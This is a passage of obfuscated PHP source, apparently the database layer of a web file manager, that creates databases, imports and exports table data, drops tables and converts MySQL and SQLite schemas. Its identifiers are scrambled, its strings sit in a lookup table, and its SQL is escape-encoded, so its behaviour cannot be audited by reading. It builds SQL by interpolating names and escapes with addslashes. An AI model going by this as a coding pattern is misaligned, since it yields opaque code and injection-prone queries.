$Ú¤À„æ½[$Ü½„û‹Ğ[282]] : $Ü½„û‹Ğ[12]), $this->parseWhere(!empty($Ú¤À„æ½[$Ü½„û‹Ğ[275]]) ? $Ú¤À„æ½[$Ü½„û‹Ğ[275]] : $Ü½„û‹Ğ[12]), $this->parseGroup(!empty($Ú¤À„æ½[$Ü½„û‹Ğ[515]]) ? $Ú¤À„æ½[$Ü½„û‹Ğ[515]] : $Ü½„û‹Ğ[12]), $this->parseHaving(!empty($Ú¤À„æ½[$Ü½„û‹Ğ[1063]]) ? $Ú¤À„æ½[$Ü½„û‹Ğ[1063]] : $Ü½„û‹Ğ[12]), $this->parseOrder(!empty($Ú¤À„æ½[$Ü½„û‹Ğ[365]]) ? $Ú¤À„æ½[$Ü½„û‹Ğ[365]] : $Ü½„û‹Ğ[12]), $this->parseLimit(!empty($Ú¤À„æ½[$Ü½„û‹Ğ[292]]) ? $Ú¤À„æ½[$Ü½„û‹Ğ[292]] : $Ü½„û‹Ğ[12]), $this->parseUnion(!empty($Ú¤À„æ½[$Ü½„û‹Ğ[347]]) ? $Ú¤À„æ½[$Ü½„û‹Ğ[347]] : $Ü½„û‹Ğ[12]), $this->parseComment(!empty($Ú¤À„æ½[$Ü½„û‹Ğ[354]]) ? $Ú¤À„æ½[$Ü½„û‹Ğ[354]] : $Ü½„û‹Ğ[12])), $¯€ØàĞÂ); return $¯€ØàĞÂ; } public function getLastSql($º¬¦â = '') { return $º¬¦â ? $this->modelSql[$º¬¦â] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Ìï–îÌÜ) { return addslashes($Ìï–îÌÜ); } public function setModel($Í‰îÇ†‡) { $this->model = $Í‰îÇ†‡; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ê…Ğøƒ” = array()) { $²øßŠ™é =& $_SERVER[Ì¥ŞÒ°£]; if (empty($ê…Ğøƒ”)) { $ê…Ğøƒ” = $GLOBALS[$²øßŠ™é[6]][$²øßŠ™é[21]]; } $this->database = $ê…Ğøƒ”; } public function model($Ø‘íÅş¢ = '') { return new ModelBase($Ø‘íÅş¢, $_SERVER[Ì¥ŞÒ°£][12], $this->database); } public function db($»öúä¹¿ = false) { $¦ÀºãÅú =& $_SERVER[Ì¥ŞÒ°£]; $Ù×»÷°ª = array_change_key_case($this->database); if ($this->dbType() == $¦ÀºãÅú[13] || !$»öúä¹¿) { return $this->model()->db(); } $õüˆÄûÄ = $Ù×»÷°ª[$¦ÀºãÅú[977]]; $Ù×»÷°ª[$¦ÀºãÅú[977]] = $¦ÀºãÅú[12]; if ($Ù×»÷°ª[$¦ÀºãÅú[972]] == $¦ÀºãÅú[969]) { $Ş·óº™ø = $Ù×»÷°ª[$¦ÀºãÅú[978]]; $Ù×»÷°ª[$¦ÀºãÅú[978]] = substr($Ş·óº™ø, 0, strrpos($Ş·óº™ø, $¦ÀºãÅú[1064])); } $this->database = $Ù×»÷°ª; $æÜ±À = $this->model()->db(); try { $ÃñÚÒ—• = $æÜ±À->execute("\163\150\x6f\167\40\144\141\164\141\142\141\163\x65\x73\40\154\151\x6b\145\x20\x27{$õüˆÄûÄ}\47"); } catch (Exception $û„âáÅæ) { } if (!$ÃñÚÒ—•) { $æÜ±À->execute("\x63\162\x65\141\x74\145\40\x64\x61\x74\x61\142\x61\x73\x65\x20\x60{$õüˆÄûÄ}\140"); } $Ù×»÷°ª[$¦ÀºãÅú[977]] = $õüˆÄûÄ; if ($Ù×»÷°ª[$¦ÀºãÅú[972]] == $¦ÀºãÅú[969]) { $Ù×»÷°ª[$¦ÀºãÅú[978]] .= $¦ÀºãÅú[1064] . $õüˆÄûÄ; } $this->database = $Ù×»÷°ª; $æÜ±À->execute("\x75\163\145\40\x60{$õüˆÄûÄ}\x60"); return $æÜ±À; } public function createTable($ä‚ÕğÒÅ, &$êØşÔâÁ) { $œÄ¹½õŠ =& $_SERVER[Ì¥ŞÒ°£]; if (!IO::exist($ä‚ÕğÒÅ)) { ActionCall($œÄ¹½õŠ[1065], !0, 0); show_json(LNG($œÄ¹½õŠ[1066]), !1); } $÷¯ş ö¥ = $this->model()->db(); $©°Ğ¿¯ò = sqlSplit(IO::getContent($ä‚ÕğÒÅ)); foreach ($©°Ğ¿¯ò as $Ô‹¡æªÌ) { $şÒÔÎßò = stripos($Ô‹¡æªÌ, $œÄ¹½õŠ[1067]) === 0; if ($şÒÔÎßò) { $êØşÔâÁ->task[$œÄ¹½õŠ[788]] += 1; } $÷¯ş ö¥->execute($Ô‹¡æªÌ); if ($şÒÔÎßò) { preg_match($œÄ¹½õŠ[1068], $Ô‹¡æªÌ, $İ‰Åç—œ); $êØşÔâÁ->task[$œÄ¹½õŠ[1069]] = $İ‰Åç—œ[1]; $êØşÔâÁ->update(1); } } } public function insertTable($Õ®ˆŠ÷±, &$©¦ñã‘‹) { $²ÆÀ½ï =& $_SERVER[Ì¥ŞÒ°£]; $”«»Œ¥ = $this->model()->db(); $ŸˆÛîúá = $ÂÌ¡ú»º ? array($ÂÌ¡ú»º) : $”«»Œ¥->getTables(); foreach ($Õ®ˆŠ÷± as $»‘íÂë˜) { $ÂÌ¡ú»º = basename($»‘íÂë˜, $²ÆÀ½ï[790]); if (!in_array($ÂÌ¡ú»º, $ŸˆÛîúá)) { continue; } $©¦ñã‘‹->task[$²ÆÀ½ï[1069]] = $ÂÌ¡ú»º; if (get_filesize($»‘íÂë˜) == 0) { continue; } $şÄÜÒš‰ = $this->sqlToDb($»‘íÂë˜, $©¦ñã‘‹); if (!$şÄÜÒš‰) { ActionCall($²ÆÀ½ï[1065], !0, 0); show_json(LNG($²ÆÀ½ï[1070]) . "\133{$ÂÌ¡ú»º}\135", !1); } } } public function sqlFromDb($º¥ñçê, $²Üˆ†ˆÄ, &$±èû§Ä€, $ÎÃãÜ¿” = '') { if ($±èû§Ä€) { $±èû§Ä€->task[$_SERVER[Ì¥ŞÒ°£][1069]] = $º¥ñçê; } $æ´ë·æá = $this->model($º¥ñçê); $¯«ƒ¥ = 0; $ÕÊ…©«› = 0; $­’‘ò² = 10000; $‘Œùú”è = fopen($²Üˆ†ˆÄ, $_SERVER[Ì¥ŞÒ°£][1071]); $Ê‹¾®Ÿ = $æ´ë·æá->getPk(); $ÁëÙÃÚÔ = $æ´ë·æá->getDbFields(); $ğç¼äú = $_SERVER[Ì¥ŞÒ°£][12]; if ($GLOBALS[$_SERVER[Ì¥ŞÒ°£][789]] && in_array($º¥ñçê, array($_SERVER[Ì¥ŞÒ°£][1072], $_SERVER[Ì¥ŞÒ°£][1073]))) { $ğç¼äú = $º¥ñçê; } do { $Ñãî¨‹° = array($Ê‹¾®Ÿ => array($_SERVER[Ì¥ŞÒ°£][1019], $ÕÊ…©«›)); $ŠÇÛÔ‡¤ = $æ´ë·æá->where($Ñãî¨‹°)->field($ÁëÙÃÚÔ)->order($Ê‹¾®Ÿ . $_SERVER[Ì¥ŞÒ°£][1074])->limit($­’‘ò²)->select(); $ŠÇÛÔ‡¤ = !empty($ŠÇÛÔ‡¤) ? $ŠÇÛÔ‡¤ : array(); if (!($Ú¯îıÑç = count($ŠÇÛÔ‡¤))) { break; } $ÍõÏÛ€Ù = end($ŠÇÛÔ‡¤); $ÕÊ…©«› = $ÍõÏÛ€Ù[$Ê‹¾®Ÿ]; $®Á®‰ãâ = array(); foreach ($ŠÇÛÔ‡¤ as $®’üÚÔø) { if ($ğç¼äú) { if ($º¥ñçê == $_SERVER[Ì¥ŞÒ°£][1072]) { if ($®’üÚÔø[$_SERVER[Ì¥ŞÒ°£][33]] == $_SERVER[Ì¥ŞÒ°£][1075]) { $¾Îá¦ê¿ = json_decode($®’üÚÔø[$_SERVER[Ì¥ŞÒ°£][374]], !0); if ($¾Îá¦ê¿[$_SERVER[Ì¥ŞÒ°£][32]] == $GLOBALS[$_SERVER[Ì¥ŞÒ°£][789]] && $¾Îá¦ê¿[$_SERVER[Ì¥ŞÒ°£][752]] != 1) { continue; } } } else { if ($®’üÚÔø[$_SERVER[Ì¥ŞÒ°£][33]] == $_SERVER[Ì¥ŞÒ°£][1076] && $®’üÚÔø[$_SERVER[Ì¥ŞÒ°£][94]] == $_SERVER[Ì¥ŞÒ°£][781]) { continue; } } } if ($ÎÃãÜ¿”) { $®’üÚÔø[$_SERVER[Ì¥ŞÒ°£][84]] = "\x7b\x69\157\72{$ÎÃãÜ¿”}\x7d" . substr($®’üÚÔø[$_SERVER[Ì¥ŞÒ°£][84]], strlen("\173\x69\157\72{$®’üÚÔø[$_SERVER[Ì¥ŞÒ°£][819]]}\175")); $®’üÚÔø[$_SERVER[Ì¥ŞÒ°£][819]] = $ÎÃãÜ¿”; } $®Á®‰ãâ[] = $_SERVER[Ì¥ŞÒ°£][1077] . $this->sqlEncode($®’üÚÔø) . $_SERVER[Ì¥ŞÒ°£][1078]; } $äŞ³Á¨ = "\111\116\x53\x45\x52\x54\40\111\116\124\x4f\x20\140{$º¥ñçê}\x60\40\50\x60" . implode($_SERVER[Ì¥ŞÒ°£][1079], $ÁëÙÃÚÔ) . $_SERVER[Ì¥ŞÒ°£][1080]; fwrite($‘Œùú”è, $äŞ³Á¨ . implode($_SERVER[Ì¥ŞÒ°£][1081], $®Á®‰ãâ) . $_SERVER[Ì¥ŞÒ°£][71] . PHP_EOL); $¯«ƒ¥ += $Ú¯îıÑç; if ($±èû§Ä€) { $±èû§Ä€->update($Ú¯îıÑç); } } while ($­’‘ò² == $Ú¯îıÑç); fclose($‘Œùú”è); return $¯«ƒ¥; } public function sqlToDb($òÊ²ºôË, &$º«†ÒŸÏ) { $ó°¯î«© =& $_SERVER[Ì¥ŞÒ°£]; $äı²Úµ¸ = $this->model()->db(); $­”Ì’ş = @fopen($òÊ²ºôË, $ó°¯î«©[1082]); if (!$­”Ì’ş) { return !1; } $ùœªÊ = 0; $Ì…¹©‹« = $ó°¯î«©[12]; $Ÿ´™œ« = array(); $‡—¤Îß = $this->dbType(); $ëŠ«Š = $‡—¤Îß == $ó°¯î«©[13] ? 500 : 2000; $Æ¤«éŠË = basename($òÊ²ºôË, $ó°¯î«©[790]); $îö‰ÛÍë = 0; $¿ù¶È·Ù = 4194304 - 104858; $Ş¸ÈŠÖ· = 1000000 - 104858; while (!feof($­”Ì’ş)) { $Ñ³¬òÄ = trim(fgets($­”Ì’ş)); if (!$Ñ³¬òÄ) { continue; } $ÒÜá÷‘ş = $this->sqlDecode($Ñ³¬òÄ, $‡—¤Îß, $Æ¤«éŠË); if (stripos($ÒÜá÷‘ş, $ó°¯î«©[355]) === 0) { if (!$Ì…¹©‹«) { $Ì…¹©‹« = $ÒÜá÷‘ş . $ó°¯î«©[53]; } continue; } if ($º«†ÒŸÏ) { $º«†ÒŸÏ->task[$ó°¯î«©[788]] += 1; } $ùœªÊ++; $Ÿ´™œ«[] = rtrim(rtrim(trim($ÒÜá÷‘ş), $ó°¯î«©[50]), $ó°¯î«©[71]); $å¬¾¦Ç¾ = null; $™ Õ›Ìğ = strlen($ÒÜá÷‘ş); $îö‰ÛÍë += $™ Õ›Ìğ; if ($îö‰ÛÍë >= ($ëŠ«Š == 500 ? $Ş¸ÈŠÖ· : $¿ù¶È·Ù)) { $å¬¾¦Ç¾ = array_pop($Ÿ´™œ«); if ($ùœªÊ > 1) { $ùœªÊ--; } } if ($ùœªÊ >= $ëŠ«Š || $å¬¾¦Ç¾) { $ÒÜá÷‘ş = $Ì…¹©‹« . implode($ó°¯î«©[50], $Ÿ´™œ«); if (!$äı²Úµ¸->execute($ÒÜá÷‘ş)) { return !1; } if ($º«†ÒŸÏ) { $º«†ÒŸÏ->update($ùœªÊ); } $Ÿ´™œ« = array(); $ùœªÊ = 0; $îö‰ÛÍë = 0; if ($å¬¾¦Ç¾) { $Ÿ´™œ« = array($å¬¾¦Ç¾); $ùœªÊ = 1; $îö‰ÛÍë = $™ Õ›Ìğ; } } } fclose($­”Ì’ş); if (!empty($Ÿ´™œ«)) { $ÒÜá÷‘ş = $Ì…¹©‹« . implode($ó°¯î«©[50], $Ÿ´™œ«); if (!$äı²Úµ¸->execute($ÒÜá÷‘ş)) { return !1; } if ($º«†ÒŸÏ) { $º«†ÒŸÏ->update($ùœªÊ); } } return !0; } public function dropTable($Â×ÔŒØ² = null) { $õÜ›¦ù³ = $this->model()->db(); $¹ş¹ìäØ = $Â×ÔŒØ² ? array($Â×ÔŒØ²) : $õÜ›¦ù³->getTables(); if (!$¹ş¹ìäØ) { return; } foreach ($¹ş¹ìäØ as $Â×ÔŒØ²) { if ($Â×ÔŒØ²) { $Â×ÔŒØ² = strtolower($Â×ÔŒØ²); } else { continue; } $õÜ›¦ù³->execute("\144\x72\157\160\40\164\x61\x62\154\145\x20\151\x66\40\x65\170\151\163\x74\163\40\x60{$Â×ÔŒØ²}\x60"); } } private function sqlEncode($ÖÛ´Ö²) { $÷ÒùÓ¸İ =& $_SERVER[Ì¥ŞÒ°£]; $æßÁŠöË = array(); foreach ($ÖÛ´Ö² as $¦ÛÕ¡‡Ï) { if (is_array($¦ÛÕ¡‡Ï)) { $¦ÛÕ¡‡Ï = json_encode_force($¦ÛÕ¡‡Ï); } $¦ÛÕ¡‡Ï = addslashes($¦ÛÕ¡‡Ï); $¦ÛÕ¡‡Ï = str_replace(array($÷ÒùÓ¸İ[1083], $÷ÒùÓ¸İ[231]), array($÷ÒùÓ¸İ[1084], $÷ÒùÓ¸İ[1085]), $¦ÛÕ¡‡Ï); $æßÁŠöË[] = str_replace($÷ÒùÓ¸İ[58], $÷ÒùÓ¸İ[1086], $¦ÛÕ¡‡Ï); } return $÷ÒùÓ¸İ[58] . implode($÷ÒùÓ¸İ[1087], $æßÁŠöË) . $÷ÒùÓ¸İ[58]; } private function sqlDecode($ÑÈãÜÁ², $Œ°…¤Ú¿, $ÙèØ¥úÔ = '') { $¯Ğ¶›„ =& $_SERVER[Ì¥ŞÒ°£]; $ÑÈãÜÁ² = str_replace(array($¯Ğ¶›„[1084], $¯Ğ¶›„[1085]), array($¯Ğ¶›„[1083], $¯Ğ¶›„[231]), $ÑÈãÜÁ²); if ($Œ°…¤Ú¿ == $¯Ğ¶›„[13]) { return $ÙèØ¥úÔ != $¯Ğ¶›„[1088] ? stripslashes($ÑÈãÜÁ²) : $ÑÈãÜÁ²; } if ($ÙèØ¥úÔ == $¯Ğ¶›„[1088]) { $ÑÈãÜÁ² = str_replace($¯Ğ¶›„[1089], $¯Ğ¶›„[118], stripslashes($ÑÈãÜÁ²)); } return $ÑÈãÜÁ²; } public function getSqlFile($²€Ü¶§ = '') { $î÷Ü’ƒ˜ =& $_SERVER[Ì¥ŞÒ°£]; $¥ı…˜·û = $this->dbType(!0); $’ò Çá = CONTROLLER_DIR . "\151\156\163\164\141\154\154\x2f\144\141\164\141\57{$¥ı…˜·û}\x2e\163\x71\x6c"; $ä¦Ì æÄ = file_get_contents($’ò Çá); $Ç§‹Ÿ¯Ø = $î÷Ü’ƒ˜[1090] . ($¥ı…˜·û == $î÷Ü’ƒ˜[806] ? $î÷Ü’ƒ˜[1091] : $î÷Ü’ƒ˜[1092]) . $î÷Ü’ƒ˜[1093]; preg_match_all($Ç§‹Ÿ¯Ø, $ä¦Ì æÄ, $‹Ãæ—ıÒ); $İ¨á£ÃÉ = $‹Ãæ—ıÒ[1]; $¨­«Ãµ§ = $this->model()->db(); $ÛıÈ½î = $¨­«Ãµ§->getTables(); $ô§ÖÇ•ı = TEMP_FILES . $î÷Ü’ƒ˜[1094] . date($î÷Ü’ƒ˜[753]) . $î÷Ü’ƒ˜[8]; del_dir($ô§ÖÇ•ı); mk_dir($ô§ÖÇ•ı); $˜ï¶•Æ‹ = $ô§ÖÇ•ı . $î÷Ü’ƒ˜[1095]; $¥Ø‹ß = $ô§ÖÇ•ı . $î÷Ü’ƒ˜[1096]; $®‡›àÍ = $¥ı…˜·û == $î÷Ü’ƒ˜[13] ? $î÷Ü’ƒ˜[806] : $î÷Ü’ƒ˜[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\x74\x61\x6c\x6c\x2f\x64\141\x74\x61\x2f{$®‡›àÍ}\x2e\163\161\x6c", $ô§ÖÇ•ı); @touch($ô§ÖÇ•ı . $¥ı…˜·û . $î÷Ü’ƒ˜[790]); $í©ˆ–¼ = fopen($˜ï¶•Æ‹, $î÷Ü’ƒ˜[1071]); $Îì®öÁ‡ = fopen($¥Ø‹ß, $î÷Ü’ƒ˜[1071]); if ($¥ı…˜·û == $î÷Ü’ƒ˜[13]) { $ÛıÈ½î = array_diff($ÛıÈ½î, array($î÷Ü’ƒ˜[786], $î÷Ü’ƒ˜[787])); $ÑÖöì° = array($î÷Ü’ƒ˜[1097], $î÷Ü’ƒ˜[1098], $î÷Ü’ƒ˜[1099]); fwrite($Îì®öÁ‡, implode(PHP_EOL, $ÑÖöì°) . PHP_EOL . PHP_EOL); foreach ($ÛıÈ½î as $Ÿ¬šüÛ­) { $ıÁöØ» = $this->sqlFromSqlite($Ÿ¬šüÛ­); if (!$ıÁöØ»[$î÷Ü’ƒ˜[13]]) { continue; } fwrite($Îì®öÁ‡, $ıÁöØ»[$î÷Ü’ƒ˜[13]] . PHP_EOL . PHP_EOL); if (!in_array($Ÿ¬šüÛ­, $İ¨á£ÃÉ)) { fwrite($í©ˆ–¼, $ıÁöØ»[$î÷Ü’ƒ˜[806]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ÛıÈ½î as $Ÿ¬šüÛ­) { $ıÁöØ» = $this->sqlFromMysql($Ÿ¬šüÛ­); if (!$ıÁöØ»[$î÷Ü’ƒ˜[806]]) { continue; } fwrite($í©ˆ–¼, $ıÁöØ»[$î÷Ü’ƒ˜[806]] . PHP_EOL . PHP_EOL); if (!in_array($Ÿ¬šüÛ­, $İ¨á£ÃÉ)) { fwrite($Îì®öÁ‡, $ıÁöØ»[$î÷Ü’ƒ˜[13]] . PHP_EOL . PHP_EOL); } } } fclose($í©ˆ–¼); fclose($Îì®öÁ‡); $ä¦Ì æÄ = array($î÷Ü’ƒ˜[806] => $˜ï¶•Æ‹, $î÷Ü’ƒ˜[13] => $¥Ø‹ß); return $²€Ü¶§ ? $ä¦Ì æÄ[$²€Ü¶§] : $ä¦Ì æÄ; } public function dbType($ıÔ’œ“± = false) { $´ñÊÕ¦ =& $_SERVER[Ì¥ŞÒ°£]; $Éé…™Æ€ = $ıÔ’œ“± ? $GLOBALS[$´ñÊÕ¦[6]][$´ñÊÕ¦[21]] : $this->database; $Éé…™Æ€ = array_change_key_case($Éé…™Æ€); $ÏØª«’– = $Éé…™Æ€[$´ñÊÕ¦[972]]; if ($ÏØª«’– == $´ñÊÕ¦[969]) { $ößŞº•“ = explode($´ñÊÕ¦[4], $Éé…™Æ€[$´ñÊÕ¦[978]]); $ÏØª«’– = $ößŞº•“[0]; } $˜ÂÏÉÊ = array($´ñÊÕ¦[1100] => $´ñÊÕ¦[13], $´ñÊÕ¦[917] => $´ñÊÕ¦[806]); if (isset($˜ÂÏÉÊ[$ÏØª«’–])) { $ÏØª«’– = $˜ÂÏÉÊ[$ÏØª«’–]; } return $ÏØª«’–; } public function sqlFromMysql($Ÿ¤£ı¹ê, $ Ö£Í¯œ = '') { $Ùë¥¤Şì =& $_SERVER[Ì¥ŞÒ°£]; $Îš‡æš = $this->model()->db(); $ÁÉÍÂ®à = $Îš‡æš->query($Ùë¥¤Şì[1101] . $Ÿ¤£ı¹ê . $Ùë¥¤Şì[385]); if (!$ÁÉÍÂ®à || !$ÁÉÍÂ®à[0]) { return !1; } $çàĞ¹ä = _get($ÁÉÍÂ®à[0], $Ùë¥¤Şì[1102], $Ùë¥¤Şì[12]); if (!$çàĞ¹ä) { return !1; } $î‡€‰Ò™ = "\104\122\117\x50\x20\x54\101\102\114\x45\40\x49\x46\x20\105\130\x49\x53\x54\123\40\140{$Ÿ¤£ı¹ê}\x60\x3b" . PHP_EOL . $çàĞ¹ä . $Ùë¥¤Şì[71]; if ($ Ö£Í¯œ && $ Ö£Í¯œ == $Ùë¥¤Şì[806]) { return $î‡€‰Ò™; } $¿¤ÊÚù¯ = array_change_key_case($GLOBALS[$Ùë¥¤Şì[6]][$Ùë¥¤Şì[21]]); $ˆäà„–Ä = $¿¤ÊÚù¯[$Ùë¥¤Şì[977]]; $Úº·•ëÜ = $Ùë¥¤Şì[1103] . $ˆäà„–Ä . $Ùë¥¤Şì[1104] . $Ÿ¤£ı¹ê . $Ùë¥¤Şì[58]; $ø¿ŠÄ˜Ë = $Ùë¥¤Şì[1105] . $Ÿ¤£ı¹ê . $Ùë¥¤Şì[903]; $ã¾»³¹ö = $Îš‡æš->query($Úº·•ëÜ); if (empty($ã¾»³¹ö)) { $ÍÎòâÉ× = array($Ùë¥¤Şì[806] => $Ùë¥¤Şì[12], $Ùë¥¤Şì[13] => $Ùë¥¤Şì[12]); return $ Ö£Í¯œ ? $ÍÎòâÉ×[$ Ö£Í¯œ] : $ÍÎòâÉ×; } $ºªàûÒÆ = $Îš‡æš->query($ø¿ŠÄ˜Ë); $­Ä­¿¬Ç = $Ùë¥¤Şì[12]; $ü°…Àí = array(); foreach ($ºªàûÒÆ as $Ÿ­Â€°î) { if (!$­Ä­¿¬Ç && $Ÿ­Â€°î[$Ùë¥¤Şì[1106]] == $Ùë¥¤Şì[1107]) { $­Ä­¿¬Ç = $Ÿ­Â€°î[$Ùë¥¤Şì[1108]]; } if (isset($ü°…Àí[$Ÿ­Â€°î[$Ùë¥¤Şì[1106]]])) { $ü°…Àí[$Ÿ­Â€°î[$Ùë¥¤Şì[1106]]][$Ùë¥¤Şì[1109]][] = $Ÿ­Â€°î[$Ùë¥¤Şì[1108]]; continue; } $ü°…Àí[$Ÿ­Â€°î[$Ùë¥¤Şì[1106]]] = array($Ùë¥¤Şì[1110] => $Ÿ­Â€°î[$Ùë¥¤Şì[1106]], $Ùë¥¤Şì[1109] => array($Ÿ­Â€°î[$Ùë¥¤Şì[1108]]), $Ùë¥¤Şì[1111] => $Ÿ­Â€°î[$Ùë¥¤Şì[1112]] == $Ùë¥¤Şì[88] ? 0 : 1); } $¦³á»É = array(); foreach ($ü°…Àí as $Ÿ­Â€°î) { $ıìÌÃ¢‘ = $Ÿ­Â€°î[$Ùë¥¤Şì[1110]] == $Ùë¥¤Şì[1107]; $…£øÙ¦Ú = array($Ùë¥¤Şì[1113], $Ÿ­Â€°î[$Ùë¥¤Şì[1111]] == $Ùë¥¤Şì[88] && !$ıìÌÃ¢‘ ? $Ùë¥¤Şì[1114] : $Ùë¥¤Şì[12], $Ùë¥¤Şì[1115], $Ùë¥¤Şì[1116] . $Ÿ¤£ı¹ê . $Ùë¥¤Şì[11] . ($ıìÌÃ¢‘ ? $Ùë¥¤Şì[1117] : $Ÿ­Â€°î[$Ùë¥¤Şì[1110]]) . $Ùë¥¤Şì[118], $Ùë¥¤Şì[1118], $Ùë¥¤Şì[118] . $Ÿ¤£ı¹ê . $Ùë¥¤Şì[118], $Ùë¥¤Şì[1119] . implode($Ùë¥¤Şì[1120], $Ÿ­Â€°î[$Ùë¥¤Şì[1109]]) . $Ùë¥¤Şì[1121]); $¦³á»É[] = implode($Ùë¥¤Şì[53], $…£øÙ¦Ú) . $Ùë¥¤Şì[71]; } $©áÎŠ† = array(); $ì‹ô÷É´ = array($Ùë¥¤Şì[1122] => $Ùë¥¤Şì[1123], $Ùë¥¤Şì[1123] => $Ùë¥¤Şì[1123], $Ùë¥¤Şì[288] => $Ùë¥¤Şì[315], $Ùë¥¤Şì[287] => $Ùë¥¤Şì[315]); foreach ($ã¾»³¹ö as $Ÿ­Â€°î) { $…£øÙ¦Ú = array($Ùë¥¤Şì[118] . $Ÿ­Â€°î[$Ùë¥¤Şì[1124]] . $Ùë¥¤Şì[118], isset($ì‹ô÷É´[$Ÿ­Â€°î[$Ùë¥¤Şì[1125]]]) ? $ì‹ô÷É´[$Ÿ­Â€°î[$Ùë¥¤Şì[1125]]] : $Ÿ­Â€°î[$Ùë¥¤Şì[1126]], $Ÿ­Â€°î[$Ùë¥¤Şì[1127]] == $Ùë¥¤Şì[901] ? $Ùë¥¤Şì[1128] : $Ùë¥¤Şì[1129], $Ÿ­Â€°î[$Ùë¥¤Şì[1124]] == $­Ä­¿¬Ç ? $Ùë¥¤Şì[1130] : $Ùë¥¤Şì[12], $Ÿ­Â€°î[$Ùë¥¤Şì[954]] ? strtoupper(str_replace($Ùë¥¤Şì[11], $Ùë¥¤Şì[12], $Ÿ­Â€°î[$Ùë¥¤Şì[954]])) : $Ùë¥¤Şì[12]); $©áÎŠ†[] = trim(implode($Ùë¥¤Şì[53], $…£øÙ¦Ú)); } $¸‰Ş©ã¢ = array($Ùë¥¤Şì[1131] . $Ÿ¤£ı¹ê . $Ùë¥¤Şì[1132], $Ùë¥¤Şì[1133] . $Ÿ¤£ı¹ê . $Ùë¥¤Şì[1134], implode($Ùë¥¤Şì[50] . PHP_EOL, $©áÎŠ†), $Ùë¥¤Şì[951]); $ÏµøÒ†¶ = implode(PHP_EOL, array_merge($¸‰Ş©ã¢, $¦³á»É)); if ($ Ö£Í¯œ && $ Ö£Í¯œ == $Ùë¥¤Şì[13]) { return $ÏµøÒ†¶; } $ÍÎòâÉ× = array($Ùë¥¤Şì[806] => $î‡€‰Ò™, $Ùë¥¤Şì[13] => $ÏµøÒ†¶); return $ Ö£Í¯œ ? $ÍÎòâÉ×[$ Ö£Í¯œ] : $ÍÎòâÉ×; } public function sqlFromSqlite($ØòŞ©ƒ©, $ŞôÊü = '') { $ñãÄìÅï =& $_SERVER[Ì¥ŞÒ°£]; $ÉÛ€¹êï = $this->model()->db(); $ÛİÈ–Š” = "\120\x52\101\107\115\x41\40\124\x41\102\114\x45\137\111\116\106\117\x20\50\x27{$ØòŞ©ƒ©}\47\51"; $•è¾åµ­ = "\x53\105\114\x45\x43\x54\40\52\40\x46\x52\x4f\x4d\x20\x73\161\x6c\151\164\145\137\x6d\x61\x73\164\x65\x72\40\127\110\x45\122\105\x20\164\x62\x6c\137\156\x61\x6d\145\x20\75\40\47{$ØòŞ©ƒ©}\47"; $´°‘‘¤Ÿ = $ÉÛ€¹êï->query($ÛİÈ–Š”); if (empty($´°‘‘¤Ÿ)) { $­‚ŠÖÎ = array($ñãÄìÅï[806] => $ñãÄìÅï[12], $ñãÄìÅï[13] => $ñãÄìÅï[12]); return $ŞôÊü ? $­‚ŠÖÎ[$ŞôÊü] : $­‚ŠÖÎ; } $Ô´ÕÓñô = $ÉÛ€¹êï->query($•è¾åµ­); $É°•©Ê = $Šóú³¿• = array(); foreach ($Ô´ÕÓñô as $ªïƒ„¨) { if ($ªïƒ„¨[$ñãÄìÅï[33]] == $ñãÄìÅï[279]) { $É°•©Ê[] = $ªïƒ„¨[$ñãÄìÅï[1135]]; } else { $Šóú³¿•[$ªïƒ„¨[$ñãÄìÅï[32]]] = $ªïƒ„¨[$ñãÄìÅï[1135]]; } } $ÉãŸñŞ­ = array_merge(array($ñãÄìÅï[1131] . $ØòŞ©ƒ© . $ñãÄìÅï[118]), $É°•©Ê, array_values($Šóú³¿•)); $ÉãŸñŞ­ = implode($ñãÄìÅï[71] . PHP_EOL, $ÉãŸñŞ­) . $ñãÄìÅï[71]; if ($ŞôÊü && $ŞôÊü == $ñãÄìÅï[13]) { return $ÉãŸñŞ­; } $…Ùîüèª = array(); $İ˜é¹Îí = array($ñãÄìÅï[1123] => $ñãÄìÅï[1136], $ñãÄìÅï[315] => $ñãÄìÅï[1137]); $îïâÙ†ô = $ñãÄìÅï[12]; foreach ($´°‘‘¤Ÿ as $ªïƒ„¨) { if ($ªïƒ„¨[$ñãÄìÅï[57]] == $ñãÄìÅï[88]) { $îïâÙ†ô = $ªïƒ„¨[$ñãÄìÅï[32]]; } $Ä ¿·»× = array($ñãÄìÅï[385] . $ªïƒ„¨[$ñãÄìÅï[32]] . $ñãÄìÅï[385], isset($İ˜é¹Îí[$ªïƒ„¨[$ñãÄìÅï[33]]]) ? $İ˜é¹Îí[$ªïƒ„¨[$ñãÄìÅï[33]]] : $ªïƒ„¨[$ñãÄìÅï[33]], $ªïƒ„¨[$ñãÄìÅï[35]] == $ñãÄìÅï[88] ? $ñãÄìÅï[1128] : $ñãÄìÅï[1138] . $ªïƒ„¨[$ñãÄìÅï[56]], $ªïƒ„¨[$ñãÄìÅï[57]] == $ñãÄìÅï[88] ? $ñãÄìÅï[1139] : $ñãÄìÅï[12]); $…Ùîüèª[] = trim(implode($ñãÄìÅï[53], $Ä ¿·»×)); } foreach ($Šóú³¿• as $·À«Ö¾î => $œ³¤öŠİ) { $ª¨èÆ£³ = str_replace($ñãÄìÅï[1140] . $ØòŞ©ƒ© . $ñãÄìÅï[11], $ñãÄìÅï[12], $·À«Ö¾î); $öñÆµ‘ş = str_replace(array($ñãÄìÅï[118], $ñãÄìÅï[962]), $ñãÄìÅï[385], substr($œ³¤öŠİ, stripos($œ³¤öŠİ, $ñãÄìÅï[260]))); if ($ª¨èÆ£³ == $ñãÄìÅï[1117]) { $è£âš€‹ = $ñãÄìÅï[1141] . $îïâÙ†ô . $ñãÄìÅï[1142]; } else { $è£âš€‹ = (stripos($ª¨èÆ£³, $ñãÄìÅï[11]) ? $ñãÄìÅï[1143] : $ñãÄìÅï[12]) . ($ñãÄìÅï[1144] . $ª¨èÆ£³ . $ñãÄìÅï[1145] . $öñÆµ‘ş); } $…Ùîüèª[] = $è£âš€‹; } $Áïåü§ƒ = array($ñãÄìÅï[1146] . $ØòŞ©ƒ© . $ñãÄìÅï[1147], $ñãÄìÅï[1148] . $ØòŞ©ƒ© . $ñãÄìÅï[1149], 